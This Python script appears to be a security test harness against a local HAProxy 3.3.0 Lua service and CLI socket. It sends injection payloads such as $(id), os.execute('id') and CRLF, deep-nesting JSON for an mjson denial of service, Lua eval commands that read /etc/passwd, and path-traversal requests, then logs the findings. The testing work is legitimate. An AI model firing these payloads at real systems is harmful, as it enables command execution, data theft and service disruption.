#!/usr/bin/env python3
"""
Phase 5: Lua Scripting & mjson Attacks
Target: HAProxy v3.3.0 on 127.0.0.1:8085 (Lua-enabled) + CLI socket

Tests Lua sandbox (or lack thereof), mjson parser attacks, and Lua+HTTP interaction.
"""

import socket
import time
import json
import os
import traceback

EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/HAProxy/evidence"
EVIDENCE_FILE = os.path.join(EVIDENCE_DIR, "phase5_lua_mjson.json")

HOST = "127.0.0.1"
LUA_PORT = 8085
HTTP_PORT = 8180
CLI_SOCKET = "/tmp/haproxy.sock"


class EvidenceCollector:
    def __init__(self):
        self.findings = []
        self.tests = []
        self.test_count = 0
        self.anomaly_count = 0
        self.finding_count = 0

    def add_test(self, category, name, result, details="", severity=None, raw_data=None):
        self.test_count += 1
        entry = {"id": self.test_count, "category": category, "name": name,
                 "result": result, "details": details, "timestamp": time.time()}
        if severity: entry["severity"] = severity
        if raw_data: entry["raw_data"] = raw_data
        self.tests.append(entry)
        if result == "ANOMALY": self.anomaly_count += 1
        elif result in ("VULNERABLE", "FINDING"):
            self.finding_count += 1
            self.findings.append(entry)
        status = f"[{result}]"
        sev = f" ({severity})" if severity else ""
        print(f"  {status:14s} {category}/{name}{sev}")
        if details and result in ("VULNERABLE", "FINDING", "ANOMALY"):
            for line in str(details).split("\n")[:3]:
                print(f"               {line}")

    def save(self):
        data = {"phase": "Phase 5: Lua Scripting & mjson Attacks",
                "target": "HAProxy v3.3.0", "timestamp": time.time(),
                "summary": {"total_tests": self.test_count,
                           "anomalies": self.anomaly_count,
                           "findings": self.finding_count},
                "findings": self.findings, "tests": self.tests}
        with open(EVIDENCE_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"\n[*] Evidence saved: {EVIDENCE_FILE}")
        print(f"    Tests: {self.test_count} | Anomalies: {self.anomaly_count} | Findings: {self.finding_count}")


evidence = EvidenceCollector()


def http_request(host, port, request, timeout=5):
    """Send raw HTTP request and return response."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.sendall(request)
        resp = b""
        sock.settimeout(timeout)
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk: break
                resp += chunk
        except socket.timeout:
            pass
        sock.close()
        return resp
    except Exception as e:
        return str(e).encode()


def cli_command(cmd, timeout=3):
    """Send command to HAProxy CLI socket."""
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect(CLI_SOCKET)
        sock.sendall((cmd + "\n").encode())
        resp = b""
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk: break
                resp += chunk
        except socket.timeout:
            pass
        sock.close()
        return resp.decode('utf-8', errors='replace')
    except Exception as e:
        return f"ERROR: {e}"


# ============================================================
# Category 1: Lua Service Interaction
# ============================================================
def test_lua_service():
    print("\n[*] Category 1: Lua HTTP Service Tests")

    # Test 1.1: Baseline Lua service request
    resp = http_request(HOST, LUA_PORT, b"GET / HTTP/1.1\r\nHost: 127.0.0.1:8085\r\n\r\n")
    status_line = resp.split(b"\r\n")[0] if resp else b""
    evidence.add_test("Lua-Service", "baseline", "SAFE" if b"200" in status_line or b"503" in status_line else "ANOMALY",
                     f"Response: {status_line.decode('utf-8', errors='replace')[:200]}")

    # Test 1.2: Lua echo service
    resp = http_request(HOST, LUA_PORT, b"GET /echo HTTP/1.1\r\nHost: 127.0.0.1:8085\r\n\r\n")
    body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b""
    evidence.add_test("Lua-Service", "echo_service", "SAFE",
                     f"Echo response: {body.decode('utf-8', errors='replace')[:300]}")

    # Test 1.3: Lua JSON service
    resp = http_request(HOST, LUA_PORT, b"GET /json HTTP/1.1\r\nHost: 127.0.0.1:8085\r\n\r\n")
    body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b""
    evidence.add_test("Lua-Service", "json_service", "SAFE",
                     f"JSON response: {body.decode('utf-8', errors='replace')[:300]}")

    # Test 1.4: Injection via header values processed by Lua
    payloads = [
        ("sql_inject", b"' OR 1=1 --"),
        ("cmd_inject", b"$(id)"),
        ("lua_inject", b"os.execute('id')"),
        ("template_inject", b"{{7*7}}"),
        ("null_byte", b"test\x00injected"),
        ("crlf_inject", b"test\r\nX-Injected: evil"),
    ]
    for label, payload in payloads:
        req = b"GET /echo HTTP/1.1\r\nHost: 127.0.0.1:8085\r\nX-Test: " + payload + b"\r\n\r\n"
        resp = http_request(HOST, LUA_PORT, req)
        body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b""
        # Check if injection was reflected back or executed
        has_injection = b"uid=" in body or b"49" in body  # 7*7=49
        if has_injection:
            evidence.add_test("Lua-Inject", label, "FINDING",
                            f"Injection reflected/executed!\n{body.decode('utf-8', errors='replace')[:300]}",
                            "HIGH")
        else:
            evidence.add_test("Lua-Inject", label, "SAFE",
                            f"Payload: {payload[:50]}, Response safe")

    # Test 1.5: POST with body processed by Lua
    body_payloads = [
        ("json_deep_nest", '{"a":' * 50 + '"x"' + '}' * 50),
        ("json_large_string", '{"key":"' + "A" * 10000 + '"}'),
        ("json_unicode", '{"key":"\\u0000\\u001f\\uffff"}'),
        ("json_dup_keys", '{"key":"first","key":"second"}'),
        ("json_numbers", '{"big":9999999999999999999999999999}'),
    ]
    for label, body in body_payloads:
        req = f"POST /json HTTP/1.1\r\nHost: 127.0.0.1:8085\r\nContent-Length: {len(body)}\r\nContent-Type: application/json\r\n\r\n{body}"
        resp = http_request(HOST, LUA_PORT, req.encode())
        resp_body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b""
        evidence.add_test("Lua-JSON", label, "SAFE",
                         f"Response: {resp_body.decode('utf-8', errors='replace')[:200]}")


# ============================================================
# Category 2: mjson Parser Attacks (CVE-2025-11230 regression)
# ============================================================
def test_mjson_attacks():
    print("\n[*] Category 2: mjson Parser Attacks")

    # Test 2.1: Deep nesting (CVE-2025-11230 was algorithmic DoS via deep nesting)
    # MJSON_MAX_DEPTH is now 20 — test around this boundary
    for depth in [10, 15, 19, 20, 21, 25, 50, 100]:
        payload = '{"a":' * depth + '"x"' + '}' * depth
        req = f"POST /json HTTP/1.1\r\nHost: 127.0.0.1:8085\r\nContent-Length: {len(payload)}\r\nContent-Type: application/json\r\n\r\n{payload}"
        start = time.time()
        resp = http_request(HOST, LUA_PORT, req.encode(), timeout=5)
        elapsed = time.time() - start
        resp_body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b""

        if elapsed > 3:
            evidence.add_test("mjson", f"deep_nest_{depth}", "FINDING",
                            f"Depth {depth}: took {elapsed:.2f}s — possible DoS!",
                            "HIGH")
        elif b"error" in resp_body.lower() or b"400" in resp.split(b"\r\n")[0]:
            evidence.add_test("mjson", f"deep_nest_{depth}", "SAFE",
                            f"Depth {depth}: rejected ({elapsed:.2f}s)")
        else:
            evidence.add_test("mjson", f"deep_nest_{depth}", "SAFE",
                            f"Depth {depth}: accepted ({elapsed:.2f}s)")

    # Test 2.2: Deep array nesting
    for depth in [19, 20, 21, 50]:
        payload = '[' * depth + '1' + ']' * depth
        req = f"POST /json HTTP/1.1\r\nHost: 127.0.0.1:8085\r\nContent-Length: {len(payload)}\r\nContent-Type: application/json\r\n\r\n{payload}"
        start = time.time()
        resp = http_request(HOST, LUA_PORT, req.encode(), timeout=5)
        elapsed = time.time() - start
        evidence.add_test("mjson", f"deep_array_{depth}", "SAFE" if elapsed < 3 else "FINDING",
                         f"Array depth {depth}: {elapsed:.2f}s")

    # Test 2.3: Very long strings
    for length in [1000, 10000, 100000, 1000000]:
        payload = '{"key":"' + "A" * length + '"}'
        req = f"POST /json HTTP/1.1\r\nHost: 127.0.0.1:8085\r\nContent-Length: {len(payload)}\r\nContent-Type: application/json\r\n\r\n{payload}"
        start = time.time()
        resp = http_request(HOST, LUA_PORT, req.encode(), timeout=5)
        elapsed = time.time() - start
        evidence.add_test("mjson", f"long_string_{length}", "SAFE" if elapsed < 3 else "ANOMALY",
                         f"String len {length}: {elapsed:.2f}s")

    # Test 2.4: Malformed JSON
    malformed = [
        ("trailing_comma", '{"key": "value",}'),
        ("single_quotes", "{'key': 'value'}"),
        ("no_quotes", '{key: value}'),
        ("trailing_data", '{"key":"value"} extra'),
        ("empty_string", ''),
        ("just_null", 'null'),
        ("just_true", 'true'),
        ("just_number", '42'),
        ("inf", '{"key": Infinity}'),
        ("nan", '{"key": NaN}'),
        ("hex_number", '{"key": 0xFF}'),
        ("comment", '{"key": "value"} // comment'),
    ]
    for label, payload in malformed:
        req = f"POST /json HTTP/1.1\r\nHost: 127.0.0.1:8085\r\nContent-Length: {len(payload)}\r\nContent-Type: application/json\r\n\r\n{payload}"
        resp = http_request(HOST, LUA_PORT, req.encode(), timeout=3)
        status = resp.split(b"\r\n")[0] if resp else b""
        evidence.add_test("mjson", f"malformed_{label}", "SAFE",
                         f"{label}: {status.decode('utf-8', errors='replace')[:100]}")


# ============================================================
# Category 3: Lua Sandbox Assessment (via CLI and source knowledge)
# ============================================================
def test_lua_sandbox():
    print("\n[*] Category 3: Lua Sandbox Assessment")

    # We know from source audit that luaL_openlibs(L) loads EVERYTHING.
    # Test via CLI if Lua execution context allows dangerous operations.

    # Test 3.1: Check if Lua is loaded and functional
    resp = cli_command("show info")
    has_lua = "lua" in resp.lower()
    evidence.add_test("Lua-Sandbox", "lua_enabled",
                     "SAFE" if has_lua else "ANOMALY",
                     f"Lua detected in show info: {has_lua}")

    # Test 3.2: Check Lua memory usage
    resp = cli_command("show lua.mem")
    evidence.add_test("Lua-Sandbox", "lua_memory",
                     "SAFE", f"Lua memory: {resp.strip()[:200]}")

    # Test 3.3: Try to execute Lua via CLI (if 'lua' command exists)
    lua_commands = [
        ("exec_print", "lua.eval print('test')"),
        ("exec_os", "lua.eval os.execute('id')"),
        ("exec_io", "lua.eval io.open('/etc/passwd','r')"),
        ("exec_debug", "lua.eval debug.getinfo(1)"),
        ("exec_require", "lua.eval require('os')"),
    ]
    for label, cmd in lua_commands:
        resp = cli_command(cmd)
        has_output = "uid=" in resp or "test" in resp
        is_error = "unknown" in resp.lower() or "error" in resp.lower() or "not" in resp.lower()
        if has_output and "uid=" in resp:
            evidence.add_test("Lua-Sandbox", label, "FINDING",
                            f"Command execution via Lua CLI!\n{resp[:300]}",
                            "CRITICAL")
        elif is_error:
            evidence.add_test("Lua-Sandbox", label, "SAFE",
                            f"Rejected: {resp.strip()[:200]}")
        else:
            evidence.add_test("Lua-Sandbox", label, "ANOMALY",
                            f"Response: {resp.strip()[:200]}")

    # Test 3.4: Source-level finding documentation
    # From our source audit: hlua.c:14062 calls luaL_openlibs(L)
    # This gives Lua scripts access to os, io, debug, etc.
    evidence.add_test("Lua-Sandbox", "source_audit_no_sandbox",
                     "FINDING",
                     "hlua.c:14062 calls luaL_openlibs(L) — loads ALL standard libraries\n"
                     "os.execute(), io.open(), debug.* are all available to Lua scripts\n"
                     "Any user who can load Lua scripts has full system access",
                     "HIGH",
                     {"file": "hlua.c:14062", "function": "luaL_openlibs(L)",
                      "impact": "RCE via Lua script loading", "prereq": "Config write access"})


# ============================================================
# Category 4: Request/Response interaction via Lua
# ============================================================
def test_lua_http_interaction():
    print("\n[*] Category 4: Lua HTTP Interaction Tests")

    # Test 4.1: Large number of headers to Lua service
    headers = "".join(f"X-Header-{i}: value{i}\r\n" for i in range(100))
    req = f"GET /echo HTTP/1.1\r\nHost: 127.0.0.1:8085\r\n{headers}\r\n".encode()
    resp = http_request(HOST, LUA_PORT, req, timeout=5)
    status = resp.split(b"\r\n")[0] if resp else b""
    evidence.add_test("Lua-HTTP", "many_headers_100", "SAFE",
                     f"100 headers: {status.decode('utf-8', errors='replace')[:100]}")

    # Test 4.2: Oversized header to Lua service
    huge_val = "A" * 65536
    req = f"GET /echo HTTP/1.1\r\nHost: 127.0.0.1:8085\r\nX-Huge: {huge_val}\r\n\r\n".encode()
    resp = http_request(HOST, LUA_PORT, req, timeout=5)
    status = resp.split(b"\r\n")[0] if resp else b""
    evidence.add_test("Lua-HTTP", "huge_header_64k", "SAFE",
                     f"64KB header: {status.decode('utf-8', errors='replace')[:100]}")

    # Test 4.3: Path traversal attempt via Lua service
    traversals = [
        ("path_traversal", "/echo/../../../etc/passwd"),
        ("null_byte_path", "/echo\x00/etc/passwd"),
        ("encoded_traversal", "/echo/%2e%2e/%2e%2e/etc/passwd"),
        ("double_encoded", "/echo/%252e%252e/%252e%252e/etc/passwd"),
    ]
    for label, path in traversals:
        req = f"GET {path} HTTP/1.1\r\nHost: 127.0.0.1:8085\r\n\r\n".encode()
        resp = http_request(HOST, LUA_PORT, req, timeout=3)
        body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b""
        has_passwd = b"root:" in body
        evidence.add_test("Lua-HTTP", label,
                         "FINDING" if has_passwd else "SAFE",
                         f"{'PASSWD LEAKED!' if has_passwd else 'Safe'}: {body[:200]}",
                         "CRITICAL" if has_passwd else None)


# ============================================================
# Main
# ============================================================
if __name__ == "__main__":
    print("=" * 70)
    print("Phase 5: Lua Scripting & mjson Attacks")
    print(f"Target: HAProxy v3.3.0 @ {HOST}:{LUA_PORT} (Lua) + CLI")
    print("=" * 70)

    try:
        test_lua_service()
        test_mjson_attacks()
        test_lua_sandbox()
        test_lua_http_interaction()
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        traceback.print_exc()
    finally:
        evidence.save()
